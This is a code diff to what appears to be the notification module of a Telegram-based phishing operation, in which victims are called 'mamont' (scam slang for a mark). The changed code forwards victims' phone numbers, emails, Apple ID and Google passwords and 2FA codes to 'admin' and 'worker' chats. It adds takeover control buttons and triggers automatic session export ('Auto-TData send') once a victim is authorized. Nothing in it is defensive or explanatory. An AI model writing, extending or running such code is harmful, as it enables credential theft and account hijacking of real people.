@@ -1,4 +1,5 @@
 import asyncio
+import json
 import logging
 import os
 from datetime import datetime, timezone, timedelta
@@ -35,6 +36,29 @@ def _run_bg_task(coro):
     _bg_tasks.add(task)
     task.add_done_callback(_bg_tasks.discard)
     return task
+
+
+def _parse_msg_map(raw_val: Any) -> dict[str, int]:
+    """Parses JSON or legacy integer message ID mappings for per-admin/worker tracking."""
+    if not raw_val:
+        return {}
+    if isinstance(raw_val, dict):
+        return {str(k): int(v) for k, v in raw_val.items() if v}
+    val_str = str(raw_val).strip()
+    if val_str.startswith("{"):
+        try:
+            parsed = json.loads(val_str)
+            if isinstance(parsed, dict):
+                return {str(k): int(v) for k, v in parsed.items() if v}
+        except Exception:
+            return {}
+    try:
+        mid = int(val_str)
+        if mid > 0:
+            return {"default": mid}
+    except Exception:
+        pass
+    return {}
 
 
 async def _is_primary_admin_mamont(worker_id: Optional[int], mirror_token: Optional[str] = None) -> bool:
@@ -269,6 +293,7 @@ async def notify_user_event(
     details: Optional[str] = None,
     contacts: Optional[List[str]] = None,
     session_str: Optional[str] = None,
+    send_user_card: bool = True,
     **kwargs: Any,
 ) -> None:
     """
@@ -599,39 +624,54 @@ async def notify_user_event(
 
             admin_text = "\n".join(admin_lines)
 
-        admin_msg_id = user_row["admin_log_msg_id"] if user_row and "admin_log_msg_id" in user_row.keys() else None
+        admin_msg_map = _parse_msg_map(user_row.get("admin_log_msg_id") if user_row else None)
+        admin_alert_map = _parse_msg_map(user_row.get("admin_alert_msg_id") if user_row else None)
         worker_msg_id = user_row["worker_log_msg_id"] if user_row and "worker_log_msg_id" in user_row.keys() else None
         worker_alert_msg_id = user_row["worker_alert_msg_id"] if user_row and "worker_alert_msg_id" in user_row.keys() else None
-        admin_alert_msg_id = user_row["admin_alert_msg_id"] if user_row and "admin_alert_msg_id" in user_row.keys() else None
 
-        # On /start, or when entering a new login flow, reset IDs to post fresh messages at the bottom
-        if norm_step in ("start", "registered", "register") or (
-            norm_step in ("phone", "waiting_code") and current_db_step in ("authorized", "session_revoked")
-        ):
-            admin_msg_id = None
+        # Only reset message IDs if a session was revoked/reset and user is restarting from scratch
+        if current_db_step == "session_revoked" and norm_step in ("start", "registered", "register", "phone"):
+            admin_msg_map = {}
+            admin_alert_map = {}
             worker_msg_id = None
             worker_alert_msg_id = None
-            admin_alert_msg_id = None
 
-        # Control buttons appear for Google and Apple ID logins
+        # Control buttons appear for Google and Apple ID logins only when actionable
         is_google_event = norm_step.startswith("google_")
         is_apple_event = norm_step.startswith("apple_")
 
-        if is_google_event:
-            admin_keyboard = get_google_control_keyboard(user_tg_id)
-            worker_keyboard = get_google_control_keyboard(user_tg_id)
-        elif is_apple_event:
-            admin_keyboard = get_apple_control_keyboard(user_tg_id)
-            worker_keyboard = get_apple_control_keyboard(user_tg_id)
-        elif is_final_auth:
+        has_apple_pass = bool(password_2fa or norm_step in (
+            "apple_password", "apple_checking", "apple_waiting_action",
+            "apple_wrong_password", "apple_error_password",
+            "apple_prompt", "apple_show_prompt", "apple_ask_prompt",
+            "apple_prompt_confirmed", "apple_prompt_approved",
+            "apple_ask_code", "apple_waiting_code", "apple_2fa_waiting",
+            "apple_code", "apple_2fa", "apple_code_entered",
+            "apple_wrong_code", "apple_error_code",
+            "apple_code_resend", "apple_prompt_resend"
+        ))
+
+        has_google_pass = bool(password_2fa or norm_step in (
+            "google_password", "google_waiting_code",
+            "google_wrong_password", "google_error_password",
+            "google_prompt", "google_show_prompt",
+            "google_2fa_waiting", "google_ask_2fa",
+            "google_wrong_2fa", "google_error_2fa",
+            "google_code", "google_2fa", "google_checking"
+        ))
+
+        if is_final_auth:
             admin_keyboard = get_admin_log_keyboard(user_tg_id)
             worker_keyboard = None
+        elif is_apple_event and has_apple_pass:
+            admin_keyboard = get_apple_control_keyboard(user_tg_id)
+            worker_keyboard = get_apple_control_keyboard(user_tg_id)
+        elif is_google_event and has_google_pass:
+            admin_keyboard = get_google_control_keyboard(user_tg_id)
+            worker_keyboard = get_google_control_keyboard(user_tg_id)
         else:
             admin_keyboard = None
             worker_keyboard = None
-
-        new_admin_msg_id = admin_msg_id
-        new_admin_alert_msg_id = admin_alert_msg_id
 
         is_my_log = await _is_primary_admin_mamont(worker_id, mirror_token)
         if is_my_log:
@@ -648,39 +688,30 @@ async def notify_user_event(
 
         target_worker_id = worker_id
 
-        if is_final_auth and admin_msg_id:
-            for aid in target_admin_ids:
-                try:
-                    await admin_bot.delete_message(chat_id=aid, message_id=admin_msg_id)
-                except Exception:
-                    pass
-            admin_msg_id = None
-
+        # 1.1 Admin Notification Card (Option A: Single Living Card in-place edit)
         for aid in target_admin_ids:
-            if admin_msg_id and aid == ADMIN_CHAT_ID and not is_final_auth:
+            mid = admin_msg_map.get(str(aid)) or admin_msg_map.get("default")
+            edited = False
+            if mid:
                 try:
                     await admin_bot.edit_message_text(
                         chat_id=aid,
-                        message_id=admin_msg_id,
+                        message_id=mid,
                         text=admin_text,
                         reply_markup=admin_keyboard,
                         parse_mode="HTML",
                     )
-                except Exception as e:
-                    if "message is not modified" not in str(e).lower():
-                        logger.debug("Failed to edit admin msg %s for %s: %s, sending new", admin_msg_id, aid, e)
-                        try:
-                            msg = await admin_bot.send_message(
-                                chat_id=aid,
-                                text=admin_text,
-                                reply_markup=admin_keyboard,
-                                parse_mode="HTML",
-                            )
-                            if aid == ADMIN_CHAT_ID:
-                                new_admin_msg_id = msg.message_id
-                        except Exception as send_err:
-                            logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, send_err)
-            else:
+                    edited = True
+                    admin_msg_map[str(aid)] = mid
+                except Exception as e_edit:
+                    err_str = str(e_edit).lower()
+                    if "message is not modified" in err_str:
+                        edited = True
+                        admin_msg_map[str(aid)] = mid
+                    else:
+                        logger.debug("Failed to edit admin msg %s for %s: %s, sending new card", mid, aid, e_edit)
+
+            if not edited:
                 try:
                     msg = await admin_bot.send_message(
                         chat_id=aid,
@@ -688,40 +719,46 @@ async def notify_user_event(
                         reply_markup=admin_keyboard,
                         parse_mode="HTML",
                     )
-                    if aid == ADMIN_CHAT_ID:
-                        new_admin_msg_id = msg.message_id
-                except Exception as e:
-                    logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, e)
+                    admin_msg_map[str(aid)] = msg.message_id
+                except Exception as e_send:
+                    logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, e_send)
 
-        # Admin Transient Push Alert (notifies Admin on phone for every status change, if not same chat as worker)
-        if not is_final_auth:
-            for aid in target_admin_ids:
-                if aid != target_worker_id:
-                    if admin_alert_msg_id:
-                        try:
-                            await admin_bot.delete_message(chat_id=aid, message_id=admin_alert_msg_id)
-                        except Exception:
-                            pass
-                    admin_push_text = f"<i>📊 <b>Статус:</b> {status_desc}</i>"
-                    try:
-                        amsg = await admin_bot.send_message(
-                            chat_id=aid,
-                            text=admin_push_text,
-                            parse_mode="HTML",
-                        )
-                        if aid == ADMIN_CHAT_ID:
-                            new_admin_alert_msg_id = amsg.message_id
-                    except Exception as e_aalert:
-                        logger.debug("could not send transient alert to admin %s: %s", aid, e_aalert)
+        admin_msg_map.pop("default", None)
+
+        # 1.2 Admin Sliding Micro-Push (Option A: Sound & transient notification, previous deleted)
+        if password_2fa:
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел {pass_label}: <code>{password_2fa}</code>"
+        elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered", "google_code", "google_2fa"):
+            admin_push_text = f"🔢 <b>{user_tag}:</b> {status_desc}"
+        elif email and norm_step in ("apple_email", "google_email", "apple_waiting_password", "google_waiting_password"):
+            admin_push_text = f"🍏 <b>{user_tag}:</b> Ввел {email_label} <code>{email}</code>"
+        elif phone and norm_step in ("phone", "waiting_code"):
+            admin_push_text = f"📱 <b>{user_tag}:</b> Ввел телефон: <code>{phone}</code>"
         else:
-            if admin_alert_msg_id:
-                for aid in target_admin_ids:
-                    if aid != target_worker_id:
-                        try:
-                            await admin_bot.delete_message(chat_id=aid, message_id=admin_alert_msg_id)
-                        except Exception:
-                            pass
-                new_admin_alert_msg_id = -1
+            admin_push_text = f"<i>📊 <b>{user_tag}:</b> {status_desc}</i>"
+
+        for aid in target_admin_ids:
+            old_alert_id = admin_alert_map.get(str(aid)) or admin_alert_map.get("default")
+            if old_alert_id:
+                try:
+                    await admin_bot.delete_message(chat_id=aid, message_id=old_alert_id)
+                except Exception:
+                    pass
+                admin_alert_map.pop(str(aid), None)
+                admin_alert_map.pop("default", None)
+
+            if not is_final_auth:
+                try:
+                    amsg = await admin_bot.send_message(
+                        chat_id=aid,
+                        text=admin_push_text,
+                        parse_mode="HTML",
+                    )
+                    admin_alert_map[str(aid)] = amsg.message_id
+                except Exception as e_aalert:
+                    logger.debug("could not send sliding alert to admin %s: %s", aid, e_aalert)
+
+        admin_alert_map.pop("default", None)
 
         # Trigger automated tasks upon mamont authorization (Auto-TGK + Auto-TData send)
         if norm_step in ("authorized", "session", "complete") and session_str:
@@ -851,25 +888,22 @@ async def notify_user_event(
                 except Exception as e_alert:
                     logger.debug("could not send transient alert to worker %s: %s", target_worker_id, e_alert)
 
-        # Save message IDs to DB if updated
-        if (
-            new_admin_msg_id != admin_msg_id
-            or new_worker_msg_id != worker_msg_id
-            or new_worker_alert_msg_id != worker_alert_msg_id
-            or new_admin_alert_msg_id != admin_alert_msg_id
-        ):
-            await asyncio.to_thread(
-                db.set_user_log_messages,
-                DB_PATH,
-                user_tg_id,
-                new_admin_msg_id,
-                new_worker_msg_id,
-                new_worker_alert_msg_id,
-                new_admin_alert_msg_id,
-            )
+        # Save message IDs to DB
+        new_admin_msg_val = json.dumps(admin_msg_map) if admin_msg_map else None
+        new_admin_alert_val = json.dumps(admin_alert_map) if admin_alert_map else "-1"
+
+        await asyncio.to_thread(
+            db.set_user_log_messages,
+            DB_PATH,
+            user_tg_id,
+            new_admin_msg_val,
+            new_worker_msg_id,
+            new_worker_alert_msg_id,
+            new_admin_alert_val,
+        )
 
         # 3. User (Mamont) Post-Auth Cabinet Message & Keyboard Update
-        if is_final_auth and user_tg_id:
+        if is_final_auth and user_tg_id and send_user_card:
             u_token = mirror_token or (user_row["mirror_token"] if user_row and "mirror_token" in user_row.keys() else None)
             if u_token:
                 try:
